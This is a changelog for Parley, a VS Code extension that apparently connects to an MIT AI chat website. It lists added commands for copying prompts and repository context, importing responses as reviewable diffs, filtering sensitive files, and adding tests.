- Added `Parley: Open Chat Window` command to focus the Parley chat view for docking into the Secondary Side Bar.
- Added `Parley: Open MIT Parley Website` command and sidebar button for safe browser-based Touchstone login.
- Registered on VS Code startup so docked Parley views get a webview provider more reliably.
- Added `Parley: Copy Prompt for Website` for a safe browser handoff while no official API is available.
- Added `Parley: Copy Repository Context for Website` for explicit repo snapshot handoff with ignore and secret filters.
- Added `Parley: Import Website Response` to turn copied Parley answers into reviewable VS Code diffs.
- Added command palette commands for selection, file explanation, refactoring, test generation, diagnostics fixing, terminal command suggestions, and sign-out.
- Added mock Parley provider and disabled official provider boundary.
- Added context preview, sensitive file filtering, `.parleyignore`, and optional `.gitignore` support.
- Added diff review and explicit apply workflow for proposed file changes.
- Added API discovery, security, privacy, and packaging documentation.
- Added unit tests for sensitive file filtering, ignore matching, selection context creation, and patch parsing.
